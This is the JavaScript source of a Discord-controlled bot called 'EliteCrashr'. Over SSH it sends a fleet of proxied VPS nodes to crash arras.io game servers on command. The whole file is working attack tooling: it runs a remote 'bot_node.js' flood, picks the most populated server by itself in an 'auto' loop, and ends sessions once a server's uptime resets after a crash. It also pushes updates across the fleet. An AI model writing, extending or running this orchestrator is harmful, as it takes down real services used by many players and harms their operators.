/*
!crash s cb 5 15 0 0 50
!crash auto 20 2 12 0 100 cb none (last item is specified target, servers before it are exclusions)
*/

const path = require('path');
const { exec } = require('child_process');
const fs = require('fs').promises;
const util = require('util');
const os = require('os');
const { fetch, ProxyAgent } = require('undici');
const { NodeSSH } = require('node-ssh');

let exec_async = util.promisify(exec);
let src_dir = __dirname;
let project_root = path.resolve(__dirname, '..');
let env_prefix = "source ~/.nvm/nvm.sh 2>/dev/null || source ~/.bashrc 2>/dev/null || source ~/.bash_profile 2>/dev/null || source ~/.profile 2>/dev/null || true;";

(async () => {
    let config_path = path.join(src_dir, 'bot_config.js');
    let config_eval = eval(await fs.readFile(config_path, "utf8"));
    
    let proxies = config_eval[0];
    let fetch_proxy = config_eval[2];
    let user_agent = config_eval[6];
    let token = config_eval[15];
    let channel = config_eval[16];
    let vps_data = config_eval[17];
    let send_discord_message = config_eval[19];

    let fetch_agent = fetch_proxy != "" ? new ProxyAgent("http://" + fetch_proxy) : "";

    async function is_vps_available(vps) {
        let ssh = new NodeSSH();
        try {
            await ssh.connect({
                host: vps.host,
                username: vps.user,
                password: vps.password,
                readyTimeout: 15000
            });
            ssh.dispose();
            return true;
        } catch {
            return false;
        }
    }

    function get_bot_dir(work_dir, endpoint_name) {
        return work_dir.endsWith(endpoint_name) ? work_dir : (work_dir.endsWith('/') ? work_dir + endpoint_name : work_dir + '/' + endpoint_name);
    }

    async function safe_fetch(url, agent, options = {}, attempts = 3, delay = 0) {
        options = {
            headers: {
                'User-Agent': user_agent,
                'Origin': 'https://arras.io',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
            }
        };
        if (agent) options.dispatcher = agent;
        for (let i = 0; i < attempts; i += 1) {
            try {
                let response = await fetch(url, options);
                return response;
            } catch (err) {
                if (i == attempts - 1) {
                    return { ok: false, status: 0, json: async () => ({}), text: async () => "" };
                }
                if (delay > 0) return new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    }

    send_discord_message(`EliteCrashr is now active in this channel. Total available VPS nodes: ${vps_data.length}. Total proxies in list: ${proxies.length}.`);

    let replied_ids = {};
    let bot_start = Date.now();
    let active_sessions = {};
    let session_uptimes = {};
    let available_nodes = Array.from({ length: vps_data.length }, (_, index) => index);
    let pulled_nodes = available_nodes.length;
    let auto_crash_intervals = {};
    let auto_crash_interval_id = 0;
    let servers = {};
    let servers_path = path.join(src_dir, 'servers.txt');

    try {
        let servers_data = JSON.parse(await fs.readFile(servers_path, "utf8")).status;
        servers = servers_data;
    } catch {}

    async function bot_loop(limit) {
        let messages = await (await fetch(`https://discord.com/api/v9/channels/${channel}/messages?limit=${limit}`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json', 'Authorization': `${token}` },
        })).json();
        
        if (!Array.isArray(messages)) return;
        
        let eliminate = { ...replied_ids };
        
        for (let index = 0; index < messages.length; index += 1) {
            let message = messages[index];
            if (!replied_ids[message.id]) {
                replied_ids[message.id] = true; 
                if (Date.parse(message.timestamp) - bot_start > 0) {
                    let input = message.content.trim();
                    if (input.slice(0, 6) != "!crash") continue;
                    
                    try {
                        input = input.slice(7);
                        let args = input.split(/\s+/); 
                        
                        if (args[0] == "s") {
                            try {
                                let server_data = await (await safe_fetch("https://qrp6ujau11f36bnm-c.uvwx.xyz:8443/2222/status", fetch_proxy != "" ? fetch_agent : null)).text();
                                if (server_data != "") {
                                    await fs.writeFile(servers_path, server_data);
                                    servers = JSON.parse(await fs.readFile(servers_path, "utf8")).status;
                                }
                            } catch {}
                            
                            let node_count = parseInt(args[2]);
                            if (available_nodes.length < node_count) { 
                                if (available_nodes.length == 0) {
                                    send_discord_message("There are currently 0 nodes available.", message.id);
                                    continue;
                                }
                                let words = available_nodes.length != 1 ? ["are", "s"] : ["is", ""];
                                send_discord_message(`Not enough nodes available. There ${words[0]} still ${available_nodes.length} node${words[1]} available.`, message.id);
                                continue;
                            }
                            
                            let target = args[1];
                            if (target[0] == "#") target = target.substring(1);
                            
                            if (!servers[target]) {
                                send_discord_message(`Target server '${target}' not found in active server list.`, message.id);
                                continue;
                            }
                            let target_host = servers[target].host;
                            pulled_nodes -= node_count;

                            let modules_per_worker = parseInt(args[3]);
                            let creation_delay = parseInt(args[4]);
                            let proxy_start = args.length > 5 ? parseInt(args[5]) : 0;
                            let proxy_end = args.length > 6 ? parseInt(args[6]) : proxies.length;
                            
                            let chunks = [];
                            if (node_count != 1) {
                                let chunk_div = Math.trunc((proxy_end - proxy_start) / node_count);
                                let chunk_ptr = proxy_start;
                                for (let i = 0; i < node_count - 1; i += 1) {
                                    chunks.push([chunk_ptr, chunk_ptr + chunk_div]);
                                    chunk_ptr += chunk_div;
                                }
                                chunks.push([chunk_ptr, proxy_end]);
                            } else {
                                chunks.push([proxy_start, proxy_end]);
                            }
                            
                            if (!active_sessions[target]) active_sessions[target] = [];
                            session_uptimes[target] = servers[target].uptime ?? 0;
                            let has_servers = false;
                            
                            try {
                                await fs.access(servers_path);
                                has_servers = true;
                            } catch {}
                            
                            let nodes_to_start = [];
                            for (let i = 0; i < node_count; i += 1) {
                                let node_index = available_nodes.pop();
                                nodes_to_start.push({
                                    node_index: node_index,
                                    proxy_start: chunks[i][0],
                                    proxy_end: chunks[i][1]
                                });
                                active_sessions[target].push(node_index);
                            }
                            pulled_nodes += node_count - nodes_to_start.length;
                            
                            nodes_to_start.forEach(async (node_data) => {
                                let vps = vps_data[node_data.node_index];
                                let bot_dir = get_bot_dir(vps.work_dir, vps.endpoint_name);
                                let is_available = await is_vps_available(vps);
                                
                                if (!active_sessions[target] || !active_sessions[target].includes(node_data.node_index)) return;
                                if (!is_available) {
                                    let active_session_index = active_sessions[target] ? active_sessions[target].indexOf(node_data.node_index) : -1;
                                    if (active_session_index != -1) {
                                        active_sessions[target].splice(active_session_index, 1);
                                        if (active_sessions[target].length == 0) delete active_sessions[target];
                                    }
                                    if (!available_nodes.includes(node_data.node_index)) {
                                        available_nodes.push(node_data.node_index);
                                        pulled_nodes += 1;
                                    }
                                    return;
                                }
                                
                                let ssh = new NodeSSH();
                                try {
                                    await ssh.connect({
                                        host: vps.host,
                                        username: vps.user,
                                        password: vps.password,
                                        readyTimeout: 15000
                                    });
                                    
                                    await ssh.execCommand(`mkdir -p ${bot_dir}`);
                                    if (has_servers) {
                                        await ssh.putFile(servers_path, `${bot_dir}/servers.txt`);
                                    }
                                    
                                    await ssh.execCommand("pkill -f '[n]ode bot_node.js' || true");

                                    let inner_cmd = `${env_prefix} cd ${bot_dir} && if [ -d "src" ]; then cd src; fi && nohup node bot_node.js ${target_host} ${node_data.proxy_start} ${node_data.proxy_end} ${creation_delay} ${modules_per_worker} > ${bot_dir}/bot_debug.log 2>&1 </dev/null &`;
                                    
                                    await ssh.execCommand(inner_cmd);
                                    ssh.dispose();
                                } catch (err) {
                                    if (ssh) ssh.dispose();
                                }
                            });
                            let words = available_nodes.length != 1 ? ["are", "s"] : ["is", ""];
                            send_discord_message(`Bots dispatched to ${target}. There ${words[0]} now ${available_nodes.length} node${words[1]} available.`, message.id); 
                        
                        } else if (args[0] == "log") {
                            send_discord_message(`Fetching remote debug logs from all VPS nodes...`, message.id);
                            let log_promises = vps_data.map(vps => {
                                return new Promise(async (resolve) => {
                                    let ssh = new NodeSSH();
                                    try {
                                        await ssh.connect({ host: vps.host, username: vps.user, password: vps.password, readyTimeout: 15000 });
                                        let bot_dir = get_bot_dir(vps.work_dir, vps.endpoint_name);
                                        let result = await ssh.execCommand(`tail -n 30 ${bot_dir}/bot_debug.log`);
                                        let log_content = result.stdout || result.stderr || "No log content or file missing.";
                                        send_discord_message(`**[${vps.host}] Logs:**\n\`\`\`\n${log_content.substring(0, 1900)}\n\`\`\``);
                                    } catch (err) {
                                        send_discord_message(`**[${vps.host}] Log fetch error:** ${e.message}`);
                                    } finally {
                                        if (ssh) ssh.dispose();
                                        resolve();
                                    }
                                });
                            });
                            await Promise.all(log_promises);

                        } else if (args[0] == "q") { 
                            let target = args[1] ?? "";
                            if (target[0] == "#") target = target.substring(1);
                            if (active_sessions[target]) {
                                for (let i = 0; i < active_sessions[target].length; i += 1) {
                                    let node_index = active_sessions[target][i];
                                    if (!available_nodes.includes(node_index)) {
                                        available_nodes.unshift(node_index);
                                        pulled_nodes += 1;
                                    }
                                    let vps = vps_data[node_index];
                                    
                                    let ssh = new NodeSSH();
                                    ssh.connect({ host: vps.host, username: vps.user, password: vps.password, readyTimeout: 10000 })
                                        .then(async () => {
                                            await ssh.execCommand("pkill -f '[n]ode bot_node.js' || true");
                                            ssh.dispose();
                                        })
                                        .catch(err => {});
                                }
                                let words = available_nodes.length != 1 ? ["are", "s"] : ["is", ""];
                                send_discord_message(`Terminating bots in ${target}. There ${words[0]} now ${available_nodes.length} node${words[1]} available.`, message.id);
                                delete active_sessions[target];
                                delete session_uptimes[target];
                            } else {
                                let words = available_nodes.length != 1 ? ["are", "s"] : ["is", ""];
                                send_discord_message(`Session was not found for ${target}. There ${words[0]} still ${available_nodes.length} node${words[1]} available.`, message.id);
                            }
                        
                        } else if (args[0] == "u") {
                            send_discord_message(`Forcing a clean update to all VPS nodes. Please wait, this may take a moment.`, message.id);
                            active_sessions = {};
                            session_uptimes = {};
                            available_nodes = Array.from({ length: vps_data.length }, (_, index) => index);
                            pulled_nodes = available_nodes.length;
                            let tar_name = 'update_master.tar.gz';
                            let tar_path = path.resolve(os.tmpdir(), tar_name);
                            
                            try {
                                await exec_async(`tar --exclude=node_modules --exclude=.git -czf "${tar_path}" .`, { cwd: project_root });
                                let update_promises = vps_data.map(vps => {
                                    return new Promise(async (resolve) => {
                                        let bot_dir = get_bot_dir(vps.work_dir, vps.endpoint_name);
                                        let available = await is_vps_available(vps);
                                        
                                        if (!available) {
                                            resolve();
                                            return;
                                        }
                                        
                                        let ssh = new NodeSSH();
                                        try {
                                            await ssh.connect({ host: vps.host, username: vps.user, password: vps.password, readyTimeout: 15000 });
                                            await ssh.execCommand("pkill -f '[n]ode bot_node.js' || true");
                                            
                                            await ssh.execCommand(`rm -rf ${bot_dir}`);
                                            await ssh.execCommand(`mkdir -p ${bot_dir}`);
                                            
                                            await ssh.putFile(tar_path, `${bot_dir}/${tar_name}`);
                                            
                                            let extract_cmd = `${env_prefix} cd ${bot_dir} && tar -xzf ${tar_name} && rm -f ${tar_name} && if [ -d "src" ]; then cd src; fi && npm install --force`;
                                            await ssh.execCommand(extract_cmd);
                                        } catch (err) {
                                        } finally {
                                            if (ssh) ssh.dispose();
                                        }
                                        resolve();
                                    });
                                });
                                await Promise.all(update_promises);
                                await fs.unlink(tar_path).catch(()=>{});
                                send_discord_message(`All VPS nodes successfully updated with a clean rebuild.`, message.id);
                            } catch (err) {
                                send_discord_message(`Failed to execute master update: ${err.message}`, message.id);
                            }
                        
                        } else if (args[0] == "forcestop") {
                            send_discord_message(`Force stopping all VPS nodes.`, message.id);
                            active_sessions = {};
                            session_uptimes = {};
                            available_nodes = Array.from({ length: vps_data.length }, (_, index) => index);
                            pulled_nodes = available_nodes.length;
                            for (let node in vps_data) {
                                let vps = vps_data[node];
                                
                                let ssh = new NodeSSH();
                                ssh.connect({ host: vps.host, username: vps.user, password: vps.password, readyTimeout: 10000 })
                                    .then(async () => {
                                        await ssh.execCommand("pkill -f '[n]ode bot_node.js' || true");
                                        ssh.dispose();
                                    })
                                    .catch(err => {});
                            }
                        
                        } else if (args[0] == "auto") {
                            let min_player_count = parseInt(args[1]);
                            let node_count = parseInt(args[2]);
                            let modules_per_worker = parseInt(args[3]);
                            let proxy_start = parseInt(args[4]);
                            let proxy_end = parseInt(args[5]);
                            let excluded_targets = args.slice(6, args.length - 1);
                            let specified_target = args[args.length - 1] == "none" ? undefined : args[args.length - 1];
                            
                            send_discord_message(`Establishing auto crash loop with ID ${auto_crash_interval_id}.`, message.id);
                            let most_pop_clients_avail = 0;
                            let target = "";
                            
                            async function get_target_server() {
                                if (specified_target) {
                                    target = specified_target;
                                    most_pop_clients_avail = 999999;
                                    return;
                                }
                                let server_data = await (await safe_fetch("https://qrp6ujau11f36bnm-c.uvwx.xyz:8443/2222/status", fetch_proxy != "" ? fetch_agent : null)).text();
                                if (server_data != "") {
                                    await fs.writeFile(servers_path, server_data);
                                    servers = JSON.parse(await fs.readFile(servers_path, "utf8")).status;
                                }
                                most_pop_clients_avail = 0;
                                target = "";
                                for (let server in servers) {
                                    if (servers[server].code.includes("sx")) continue;
                                    let players = servers[server].clients ?? 0;
                                    if (players > most_pop_clients_avail && !active_sessions[server] && excluded_targets.indexOf(server) == -1) {
                                        most_pop_clients_avail = players;
                                        target = server;
                                    }
                                }
                            }
                            
                            async function auto_bot_loop() {
                                await get_target_server();
                                if (target != "" && node_count <= pulled_nodes && min_player_count <= most_pop_clients_avail) {
                                    send_discord_message(`!crash s ${target} ${node_count} ${modules_per_worker} 0 ${proxy_start} ${proxy_end}`, message.id);
                                }
                            }
                            
                            auto_bot_loop();
                            auto_crash_intervals[auto_crash_interval_id] = setInterval(async () => {
                                auto_bot_loop();
                            }, 30000);
                            auto_crash_interval_id += 1;
                        
                        } else if (args[0] == "qauto") {
                            let loop_id = parseInt(args[1]);
                            if (Number.isNaN(loop_id)) {
                                send_discord_message(`Please provide a loop ID to clear.`, message.id);
                                continue;
                            }
                            if (!auto_crash_intervals[loop_id]) {
                                send_discord_message(`The provided loop ID is invalid.`, message.id);
                                continue;
                            }
                            send_discord_message(`Clearing auto-crash loop with ID ${loop_id}.`, message.id);
                            clearInterval(auto_crash_intervals[loop_id]);
                            delete auto_crash_intervals[loop_id];
                        }
                    } catch (err) {}
                }
            } else delete eliminate[message.id];
        }
        for (let id in eliminate) delete replied_ids[id];
    }
    
    setInterval(() => {
        bot_loop(50);
    }, 5000);

    setInterval(async () => {
        let server_data = await (await safe_fetch("https://qrp6ujau11f36bnm-c.uvwx.xyz:8443/2222/status", fetch_proxy != "" ? fetch_agent : null)).text();
        if (server_data != "") {
            await fs.writeFile(servers_path, server_data);
            servers = JSON.parse(await fs.readFile(servers_path, "utf8")).status;
        }
        for (let server in active_sessions) {
            if ((servers[server].uptime ?? 0) < (session_uptimes[server] ?? 30)) send_discord_message(`!crash q ${server}`);
        }
    }, 15000);
})();
